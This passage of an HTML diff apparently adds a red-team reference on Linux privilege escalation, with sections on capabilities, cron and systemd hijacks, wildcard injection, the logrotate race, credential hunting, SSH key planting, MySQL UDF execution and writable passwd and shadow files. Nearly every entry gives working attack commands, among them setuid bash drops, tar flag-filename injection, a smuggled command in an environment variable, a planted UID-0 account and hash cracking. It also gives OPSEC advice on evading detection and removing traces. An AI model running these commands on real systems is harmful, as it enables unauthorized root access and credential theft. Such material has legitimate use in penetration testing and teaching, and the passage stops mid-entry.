+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1574/007/" rel="noopener nofollow">MITRE ATT&amp;CK, Path Interception by PATH Environment Variable (T1574.007)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (PATH)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Modifying PATH is per-session and quiet, but the stand-in binary in /tmp and the anomalous child of a system binary are visible in process auditing.</p>
+</article>
+<article id="lin-caps">
+<h3>Linux Capabilities</h3>
+<p class="summary">A binary carries a capability (cap_setuid, cap_dac_override, ...) that yields root.</p>
+<p class="desc">File capabilities split root into discrete powers attached to a binary, and several are root-equivalent. cap_setuid+ep on an interpreter lets it call setuid(0) and drop a root shell. cap_dac_override reads or writes any file (edit /etc/shadow). cap_sys_admin, cap_sys_ptrace, and cap_sys_module are similarly decisive. Enumerate with getcap and match the capability to its abuse.</p>
+<h4>Requires</h4><ul class="req"><li>A binary with a dangerous capability set (cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_sys_module)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find capabilities</span>
+getcap -r / 2&gt;/dev/null</code></pre>
+<pre><code><span class="cmt"># Abuse cap_setuid on an interpreter</span>
+# e.g. python with cap_setuid+ep:
+./python -c 'import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)'</code></pre>
+<pre><code><span class="cmt"># Abuse cap_dac_override to read shadow</span>
+# a binary with cap_dac_override can open any file regardless of perms</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://gtfobins.org/#//^capabilities$" rel="noopener nofollow">GTFOBins, Capabilities</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/" rel="noopener nofollow">T1548</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1548/" rel="noopener nofollow">MITRE ATT&amp;CK, Abuse Elevation Control Mechanism (T1548)</a></li><li><a href="https://gtfobins.org/#//^capabilities$" rel="noopener nofollow">GTFOBins, Capabilities</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Using a capability is indistinguishable from legitimate use of the binary; the child shell it spawns as root is the signal. Capabilities set on non-standard binaries are themselves a red flag in a config audit.</p>
+</article>
+<article id="lin-suid-custom">
+<h3>Custom Binary Analysis</h3>
+<p class="summary">Reverse a bespoke root binary for a flaw: injection, TOCTOU, deserialization.</p>
+<p class="desc">A custom root-owned program (a setuid binary, a sudo/cron-invoked helper, a deployed JAR) is not in GTFOBins, so read it for the flaw. strings and a disassembler reveal a shelled-out command you can inject, a relative path you can hijack, or an insecure temp file. A privileged process that operates on a path it does not exclusively own is a symlink TOCTOU; one that deserializes attacker-influenced data (a sudo-run wrapper, an exposed port) is a code-execution primitive.</p>
+<h4>Requires</h4><ul class="req"><li>A custom root-owned binary/script you can read or trigger, containing an injectable command, a TOCTOU window, or an unsafe deserialization</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Triage the binary</span>
+file ./bin; strings -n8 ./bin | less
+# unpack a packaged artifact if needed:
+python pyinstxtractor.py ./bin   # PyInstaller (or: pyinstxtractor-ng ./bin); then decompile the .pyc</code></pre>
+<pre><code><span class="cmt"># Win a symlink race (TOCTOU)</span>
+while :; do ln -sf /etc/passwd /tmp/predictable 2&gt;/dev/null; done &amp;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/NationalSecurityAgency/ghidra" rel="noopener nofollow">Ghidra</a></li><li><a href="https://github.com/Gallopsled/pwntools" rel="noopener nofollow">pwntools</a></li><li><a href="https://github.com/extremecoders-re/pyinstxtractor" rel="noopener nofollow">pyinstxtractor</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">MITRE ATT&amp;CK, Exploitation for Privilege Escalation (T1068)</a></li><li><a href="https://cwe.mitre.org/data/definitions/367.html" rel="noopener nofollow">MITRE, CWE-367: TOCTOU Race Condition</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reversing is offline and silent. The exploitation step (a tight race loop, a spawned shell, a temp-file swap) is where process and file auditing can catch you.</p>
+</article></section>
+<section class="phase" id="ph-jobs"><h2 class="phase-h" style="color:oklch(0.70 0.13 183)">Jobs &amp; Services</h2><article id="lin-cat-jobs">
+<h3><span class="kind">category</span> Scheduled Jobs &amp; Services</h3>
+<p class="summary">Hijack something root runs on a schedule or on demand.</p>
+<p class="desc">Cron, systemd timers, logrotate, and root-run scripts execute as root on a schedule or event. If you can write the job, its target script, a directory it uses, or influence a wildcard it expands, your code runs as root the next time it fires.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">T1053.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation</a></li></ul>
+</article>
+<article id="lin-cron-writable">
+<h3>Writable Cron Job</h3>
+<p class="summary">A root cron job, its script, or a directory it uses is writable by you.</p>
+<p class="desc">Cron and systemd timers run jobs as their owner, usually root. Enumerate /etc/crontab, /etc/cron.*, and per-user crontabs, and watch with pspy to catch jobs not listed in a file. If the invoked script is writable, append a reverse shell or a setuid copy of bash; if only the directory is writable, drop a file the job globs in; if the job calls a command by relative name, that is a PATH hijack. Your payload runs as root on the next tick.</p>
+<h4>Requires</h4><ul class="req"><li>A cron job or systemd timer that runs as root and executes a file or directory you can write</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Enumerate scheduled jobs</span>
+cat /etc/crontab; ls -la /etc/cron.*; crontab -l
+systemctl list-timers --all</code></pre>
+<pre><code><span class="cmt"># Catch unlisted jobs live</span>
+./pspy64</code></pre>
+<pre><code><span class="cmt"># Backdoor a writable job script</span>
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt;&gt; /path/to/job.sh
+# after it fires:
+/tmp/rootbash -p</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/DominicBreuker/pspy" rel="noopener nofollow">pspy</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">T1053.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Scheduled Task/Job: Cron (T1053.003)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (cron)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The modified script and a setuid /tmp/rootbash are on-disk artifacts. pspy is quiet (it watches /proc via inotify and scans it, no root or ptrace needed), but the payload firing as root is logged by cron and auditd.</p>
+</article>
+<article id="lin-cron-wildcard">
+<h3>Cron Wildcard Injection</h3>
+<p class="summary">A root job runs a command with an unquoted * over a directory you can write.</p>
+<p class="desc">A privileged job that runs tar, rsync, chown, or 7z with an unquoted wildcard over a directory you control lets you smuggle in command-line options as filenames. tar honours --checkpoint-action, rsync honours -e, and each becomes an argument when the shell expands *. Drop files whose names are those flags plus a script, and tar/rsync/7z execute your code as root when the job expands the wildcard; chown/chmod instead take a --reference file, letting you change ownership or permissions of an arbitrary file (an indirect path to root, not direct code execution).</p>
+<h4>Requires</h4><ul class="req"><li>A root cron/job running a wildcard command (tar/rsync/chown/7z) over a directory you can write</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># tar checkpoint-action injection</span>
+cd /writable/dir/the/job/globs
+echo '#!/bin/sh' &gt; sh.sh; echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt;&gt; sh.sh; chmod +x sh.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh sh.sh'
+# after the job fires, run the setuid bash with -p or it drops back to your UID and is NOT root:
+/tmp/rb -p</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">T1053.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1053/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Scheduled Task/Job: Cron (T1053.003)</a></li><li><a href="https://gtfobins.github.io/gtfobins/tar/" rel="noopener nofollow">GTFOBins, tar</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The flag-named files are visible to anyone who lists the directory, and the spawned action is logged when the job runs. Clean up the crafted filenames after the job fires. If /tmp is mounted nosuid (common on hardened hosts), the /tmp/rb setuid trick is inert; have the action drop the setuid binary somewhere exec+suid-capable (/var/tmp or the user home) or just run a reverse shell / add a key from the action instead.</p>
+</article>
+<article id="lin-systemd">
+<h3>Writable systemd Unit / Timer</h3>
+<p class="summary">A writable unit file, or its ExecStart target, runs your command as root.</p>
+<p class="desc">Services run as root through systemd units. If a unit file, a drop-in it includes, or the binary/script named in ExecStart is writable, set ExecStart to your payload (or edit the target) and start or wait for the service. A writable timer that triggers such a unit is the scheduled variant. Relative-path or writable-PATH ExecStart lines are the same class of bug as cron PATH hijacking.</p>
+<h4>Requires</h4><ul class="req"><li>A writable systemd unit/timer, drop-in, or ExecStart target for a service that runs as root</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find writable units</span>
+find /etc/systemd /lib/systemd /usr/lib/systemd /usr/local/lib/systemd /run/systemd -writable -name '*.service' 2&gt;/dev/null
+systemctl list-units --type=service</code></pre>
+<pre><code><span class="cmt"># Point ExecStart at a payload, then run it</span>
+# in a writable .service:
+# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
+systemctl daemon-reload &amp;&amp; systemctl start &lt;unit&gt;   # if allowed</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/002/" rel="noopener nofollow">T1543.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1543/002/" rel="noopener nofollow">MITRE ATT&amp;CK, Systemd Service (T1543.002), the service path</a></li><li><a href="https://attack.mitre.org/techniques/T1053/006/" rel="noopener nofollow">MITRE ATT&amp;CK, Scheduled Task/Job: Systemd Timers (T1053.006), the timer path</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (systemd)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Editing a unit and daemon-reload are logged by the journal; a service whose ExecStart changed is an obvious integrity event. Restarting a system service may disrupt it and draw attention.</p>
+</article>
+<article id="lin-writable-script">
+<h3>Writable Root-Run Script</h3>
+<p class="summary">A script root runs (login/MOTD, app hook, NOPASSWD wrapper) is writable or injectable.</p>
+<p class="desc">Beyond cron and systemd, plenty of root-run scripts are editable or take unsanitised input: MOTD/update-motd hooks, profile scripts, application maintenance actions, a NOPASSWD wrapper. If the script itself is writable, backdoor it. If it builds a shell command from data you influence (a filename, an env var, a field in a file it parses), inject a command so it executes as root when the script runs.</p>
+<h4>Requires</h4><ul class="req"><li>A root-run script that is writable, or that builds a shell command from input you control</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find writable scripts (as current user)</span>
+find / -type f -writable \( -name '*.sh' -o -path '*update-motd*' \) 2&gt;/dev/null | grep -vE '^/(proc|sys)'</code></pre>
+<pre><code><span class="cmt"># Command injection via a controlled field</span>
+# if a root script does: eval &quot;echo $NAME&quot;  or parses your filename unsafely
+export NAME='x; cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
+# after it fires, run the setuid bash with -p or it drops privileges and is NOT root:
+/tmp/rb -p</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1059/" rel="noopener nofollow">T1059</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1059/" rel="noopener nofollow">MITRE ATT&amp;CK, Command and Scripting Interpreter (T1059)</a></li><li><a href="https://cwe.mitre.org/data/definitions/78.html" rel="noopener nofollow">MITRE, CWE-78: OS Command Injection</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A modified system script is a clear integrity signal, and the injected command runs under root in the process tree. Prefer the least conspicuous payload (a setuid drop over a callback) on monitored hosts.</p>
+</article>
+<article id="lin-logrotate">
+<h3>Logrotate (logrotten)</h3>
+<p class="summary">A root-run logrotate with create/compress, raced via a directory swap, into an arbitrary root write.</p>
+<p class="desc">logrotate runs as root and, when configured with the create or compress directive over a log directory you can rename, can be raced so that the file it re-creates lands in an attacker-chosen directory with attacker-controlled content. After logrotate renames the old log, the logrotten technique swaps the log directory for a symlink pointing at a target directory (e.g. /etc/bash_completion.d/), so the newly created file is written there, giving an arbitrary root-owned file write that drops a cron job or a setuid binary. The gating capability is directory-rename control plus the create/compress directive, not merely a writable log.</p>
+<p class="meta"><b>Affects:</b> logrotten targets logrotate versions the author tested vulnerable: 3.8.6, 3.11.0, 3.15.0, and 3.18.0. Confirm the installed version and config before attempting.</p>
+<h4>Requires</h4><ul class="req"><li>A log directory you can rename that root-run logrotate processes with the create/compress directive, plus control of rotation timing, on a vulnerable version/config</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Identify what logrotate touches</span>
+cat /etc/logrotate.conf; ls -la /etc/logrotate.d/
+ls -la &lt;the writable log being rotated&gt;</code></pre>
+<pre><code><span class="cmt"># Race the rotation (logrotten)</span>
+# create directive: payload written to a root-owned path
+./logrotten -p ./payload &lt;writable-log&gt;
+# compress directive: needs -c and a delay (-s &lt;sec&gt;) for the post-rotation compress step
+./logrotten -c -s 4 -p ./payload &lt;writable-log&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/whotwagner/logrotten" rel="noopener nofollow">logrotten (PoC)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">MITRE ATT&amp;CK, Exploitation for Privilege Escalation (T1068)</a></li><li><a href="https://github.com/whotwagner/logrotten" rel="noopener nofollow">logrotten (whotwagner), rotation-race PoC + writeup</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> logrotten blocks on inotify waiting for the rename rather than spinning, so the tells are the transient directory rename/symlink and the anomalous root-owned file appearing in a system dir (integrity monitoring can flag it), not sustained CPU. Confirm the logrotate version/options before attempting, since it is config-dependent.</p>
+</article></section>
+<section class="phase" id="ph-creds"><h2 class="phase-h" style="color:oklch(0.70 0.13 327)">Credentials</h2><article id="lin-cat-creds">
+<h3><span class="kind">category</span> Credentials &amp; Secrets</h3>
+<p class="summary">Find or capture a credential that unlocks root or another user.</p>
+<p class="desc">Operators leave secrets everywhere: config files, histories, git repos, databases, SSH keys, and live process memory. Recover one, reuse a password, crack a hash, or hijack a privileged terminal session or process to become root or a higher-privileged user.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">T1552.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation</a></li></ul>
+</article>
+<article id="lin-cred-hunt">
+<h3>Hunt Stored Credentials</h3>
+<p class="summary">Grep configs, histories, git repos, and memory for reusable secrets.</p>
+<p class="desc">Credentials leak into files everywhere. Grep application directories, dotfiles, backups, and web roots for password/secret patterns; read shell histories and env; mine readable .git repositories for secrets committed and later deleted; and check process arguments and a target process memory (via /proc/&lt;pid&gt;/mem, given ptrace access) for cleartext. A single recovered password often unlocks root through su or a sudo rule, or another user with more access.</p>
+<h4>Requires</h4><ul class="req"><li>Read access to files, histories, git history, or process memory holding a reusable secret</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Grep for secrets</span>
+grep -rniIE 'password|passwd|secret|api[_-]?key|token' /etc /opt /var/www /home 2&gt;/dev/null | head
+cat ~/.bash_history ~/.*_history 2&gt;/dev/null</code></pre>
+<pre><code><span class="cmt"># Mine a git repo history</span>
+git -C /path/to/repo log -p | grep -iE 'password|secret|key'</code></pre>
+<pre><code><span class="cmt"># Cleartext in process args / memory</span>
+ps aux | grep -iE 'pass|token'
+# read a process's memory (needs ptrace access to that PID; gcore &lt;pid&gt; also works):
+cat /proc/&lt;pid&gt;/maps; strings /proc/&lt;pid&gt;/mem 2&gt;/dev/null | grep -i pass | head</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">T1552.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Credentials In Files (T1552.001)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (interesting files)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Recursive greps across the filesystem are I/O-heavy and slow; they are only logged if the host runs file/read audit rules (auditd read watches, EDR, or fanotify), which are not the default, so scope to likely directories first. Reading another process memory via /proc/&lt;pid&gt;/mem needs ptrace access (gated by kernel.yama.ptrace_scope) and is itself suspicious.</p>
+</article>
+<article id="lin-ssh-keys">
+<h3>SSH Keys &amp; Trust</h3>
+<p class="summary">Recover a private key, abuse an SSH CA, or write an authorized_keys entry.</p>
+<p class="desc">SSH offers several trust paths beyond a password. Hunt for readable private keys (id_rsa/ed25519) in home directories, backups, and world-readable locations, and reuse a passphrase you already cracked. Where an SSH certificate authority signs user certs, a leaked CA key lets you mint a cert for any principal the server's CA config accepts (bounded by TrustedUserCAKeys and its AuthorizedPrincipalsFile / principals mapping). And any write into a target user root can drop an authorized_keys entry for a login as them.</p>
+<h4>Requires</h4><ul class="req"><li>A readable SSH private key, a leaked SSH CA signing key, or write access to a target authorized_keys</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Find private keys</span>
+find / -name 'id_*' -o -name 'authorized_keys' 2&gt;/dev/null
+grep -rl 'PRIVATE KEY' /home /root /var 2&gt;/dev/null</code></pre>
+<pre><code><span class="cmt"># Crack a key passphrase</span>
+ssh2john id_rsa &gt; h; john --wordlist=rockyou.txt h</code></pre>
+<pre><code><span class="cmt"># Mint a cert from a leaked SSH CA key</span>
+ssh-keygen -s ca_key -I &lt;cert-id&gt; -n &lt;principal&gt; user.pub   # then: ssh -i user -i user-cert.pub &lt;user&gt;@&lt;host&gt;</code></pre>
+<pre><code><span class="cmt"># Plant a key (if you can write ~/.ssh)</span>
+ssh-keygen -f k -N ''
+install -d -m700 /home/&lt;user&gt;/.ssh
+cat k.pub &gt;&gt; /home/&lt;user&gt;/.ssh/authorized_keys
+chmod 600 /home/&lt;user&gt;/.ssh/authorized_keys
+chown -R &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.ssh   # sshd StrictModes refuses group/world-writable or wrong-owner .ssh</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/openwall/john" rel="noopener nofollow">John the Ripper</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/004/" rel="noopener nofollow">T1552.004</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1552/004/" rel="noopener nofollow">MITRE ATT&amp;CK, Private Keys (T1552.004), the private-key recovery path</a></li><li><a href="https://attack.mitre.org/techniques/T1098/004/" rel="noopener nofollow">MITRE ATT&amp;CK, SSH Authorized Keys (T1098.004), the authorized_keys plant</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A new authorized_keys entry and subsequent SSH login are logged: sshd writes &quot;Accepted publickey&quot; to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL), plus wtmp/lastlog/journald entries. Reusing an existing key blends in far better than adding one.</p>
+</article>
+<article id="lin-db-creds">
+<h3>Database Credentials</h3>
+<p class="summary">Read secrets from a local DB, or run OS commands via a DB running as root.</p>
+<p class="desc">A locally reachable database is both a secret store and, if it runs as root, a code-execution primitive. Connect with credentials found on disk (or default/blank), then dump application password hashes and API keys for reuse. Where MySQL/MariaDB runs as root, a user-defined function (UDF) executes shell commands as the service account; PostgreSQL COPY ... PROGRAM and similar features are equivalents.</p>
+<h4>Requires</h4><ul class="req"><li>Access to a local database (found or default creds), ideally one whose service runs as root</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Connect and dump secrets</span>
+mysql -u root -p    # try creds from config files / blank
+# SELECT user,authentication_string FROM mysql.user;</code></pre>
+<pre><code><span class="cmt"># MySQL UDF command exec (service as root)</span>
+SHOW VARIABLES LIKE 'plugin_dir';   -- where the .so must land
+-- write the UDF library there (INTO DUMPFILE is gated by secure_file_priv):
+-- SELECT 0x&lt;hex of lib_mysqludf_sys.so&gt; INTO DUMPFILE '&lt;plugin_dir&gt;/lib_mysqludf_sys.so';
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
+SELECT sys_exec('cp /bin/bash /tmp/rb; chmod +s /tmp/rb');</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1059/004/" rel="noopener nofollow">T1059.004</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1059/004/" rel="noopener nofollow">MITRE ATT&amp;CK, Command and Scripting Interpreter: Unix Shell (T1059.004)</a></li><li><a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Credentials In Files (T1552.001)</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, MySQL UDF privilege escalation</a></li><li><a href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html" rel="noopener nofollow">Bernardo Damele, Command execution with a MySQL UDF (2009)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A UDF library dropped into the plugin directory is an on-disk artifact, and command execution from the DB process is anomalous in process telemetry. Dumping credentials is quieter than the UDF step.</p>
+</article>
+<article id="lin-cred-reuse">
+<h3>Credential Reuse &amp; Hash Cracking</h3>
+<p class="summary">Reuse a recovered password across accounts; crack a captured hash offline.</p>
+<p class="desc">Operators reuse one password everywhere, so a secret pulled from a database, config, or vault is worth replaying against other accounts via su &lt;user&gt; and ssh user@host (sudo authenticates your own current password by default, so a recovered password only reaches a sudo prompt once you can log in or su as the user who owns it). When you only hold a hash (from /etc/shadow, a DB, or a keystore), crack it offline with a wordlist and rules rather than attacking a live service. A cracked root or admin password ends the chain directly.</p>
+<h4>Requires</h4><ul class="req"><li>A recovered password to replay, or a captured hash to crack offline</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Reuse a password against local accounts</span>
+su - root    # and su to other users; try the same password on ssh/services</code></pre>
+<pre><code><span class="cmt"># Crack a shadow hash</span>
+unshadow /etc/passwd /etc/shadow &gt; u
+john --wordlist=rockyou.txt u    # or: hashcat -m 1800 hash rockyou.txt</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/openwall/john" rel="noopener nofollow">John the Ripper</a></li><li><a href="https://github.com/hashcat/hashcat" rel="noopener nofollow">hashcat</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1110/002/" rel="noopener nofollow">T1110.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1110/002/" rel="noopener nofollow">MITRE ATT&amp;CK, Password Cracking (T1110.002)</a></li><li><a href="https://attack.mitre.org/techniques/T1078/003/" rel="noopener nofollow">MITRE ATT&amp;CK, Valid Accounts: Local Accounts (T1078.003)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Cracking is offline and invisible to the target. Password reuse via su/ssh generates auth-log entries, and repeated failures can lock accounts or trip alerts; try the most likely account first.</p>
+</article>
+<article id="lin-session-hijack">
+<h3>Session / Process Hijack</h3>
+<p class="summary">Attach to a root tmux/screen socket, ptrace a process, or read the X11 display.</p>
+<p class="desc">A live privileged session or process leaks access to whoever can reach it. A tmux or screen server socket readable by your user lets you attach to another user root shell. A process handling a secret in cleartext can be ptraced to read its memory or keystrokes (a password on stdin, a --password argument). And a reachable X11 display can be screenshotted or keylogged for whatever the console user types.</p>
+<h4>Requires</h4><ul class="req"><li>A reachable tmux/screen socket of a privileged user, a ptrace-able privileged process, or access to an X11 display</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Hijack a tmux / screen session</span>
+ls -la /tmp/tmux-*/ /run/screen/*/
+tmux -S /tmp/tmux-0/default attach     # screen -x &lt;pid.tty&gt;</code></pre>
+<pre><code><span class="cmt"># ptrace a process for secrets</span>
+# same-uid target: yama scope &lt;= 1 is enough; a root/other-user target needs CAP_SYS_PTRACE or root
+gdb -p &lt;pid&gt;    # or read /proc/&lt;pid&gt;/mem, dump environ/cmdline</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1563/" rel="noopener nofollow">T1563</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1563/" rel="noopener nofollow">MITRE ATT&amp;CK, Remote Service Session Hijacking (T1563)</a></li><li><a href="https://attack.mitre.org/techniques/T1056/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Input Capture: Keylogging (T1056.001)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Attaching to a screen/tmux session may be visible to the legitimate user (a detached client, altered layout). ptrace is gated by kernel.yama.ptrace_scope and is a monitored syscall on hardened hosts.</p>
+</article></section>
+<section class="phase" id="ph-files"><h2 class="phase-h" style="color:oklch(0.70 0.13 355)">Files &amp; Shares</h2><article id="lin-cat-files">
+<h3><span class="kind">category</span> Writable Files &amp; Shares</h3>
+<p class="summary">Abuse a write to a sensitive system file or an unsquashed share.</p>
+<p class="desc">When the wrong file or share is writable, root follows directly: add an account to /etc/passwd, crack or replace a hash in /etc/shadow, turn an arbitrary-write primitive into authorized_keys or a cron job, or plant a setuid binary on an NFS export mounted no_root_squash.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1222/002/" rel="noopener nofollow">T1222.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://cwe.mitre.org/data/definitions/732.html" rel="noopener nofollow">MITRE, CWE-732: Incorrect Permission Assignment</a></li></ul>
+</article>
+<article id="lin-passwd">
+<h3>Writable /etc/passwd</h3>
+<p class="summary">Append a UID-0 account with a known password to a writable passwd file.</p>
+<p class="desc">If /etc/passwd is writable, add your own root-equivalent account. A passwd line's second field can hold a crypt(3) password hash of any format ($1$ MD5, $5$ SHA-256, $6$ SHA-512, $y$ yescrypt), which takes precedence over /etc/shadow, so append an entry with UID 0 and a password hash you generated, then su to it. Even without a hash field, a writable passwd lets you point an existing account at a shell or clear a root password prompt.</p>
+<h4>Requires</h4><ul class="req"><li>Write access to /etc/passwd</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm it is writable</span>
+ls -la /etc/passwd</code></pre>
+<pre><code><span class="cmt"># Append a UID-0 account and su in</span>
+openssl passwd -1 hacked            # -&gt; $1$...hash
+echo 'r00t:$1$...hash:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+su r00t     # password: hacked</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1136/001/" rel="noopener nofollow">T1136.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1136/001/" rel="noopener nofollow">MITRE ATT&amp;CK, Create Account: Local Account (T1136.001)</a></li><li><a href="https://attack.mitre.org/techniques/T1222/002/" rel="noopener nofollow">MITRE ATT&amp;CK, File and Directory Permissions Modification: Linux and Mac (T1222.002), the writable-file abuse</a></li><li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/" rel="noopener nofollow">InternalAllTheThings, Linux Privilege Escalation (writable /etc/passwd)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A second UID-0 account in /etc/passwd is glaring in any review and integrity monitoring flags the change. Remove the added line once you have a root shell.</p>
+</article>
+<article id="lin-shadow">
+<h3>Readable / Writable /etc/shadow</h3>
+<p class="summary">Crack the root hash if shadow is readable; replace it if writable.</p>
+<p class="desc">A misconfigured /etc/shadow is a direct route to root. If it is readable, extract the root hash and crack it offline. If it is writable, replace the root hash with one you generated and su in with the matching password. Either way the account model is untouched, so the change is subtle compared with editing /etc/passwd.</p>
+<h4>Requires</h4><ul class="req"><li>Read access (to crack) or write access (to replace the hash) on /etc/shadow</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Readable: crack the root hash</span>
+unshadow /etc/passwd /etc/shadow &gt; u
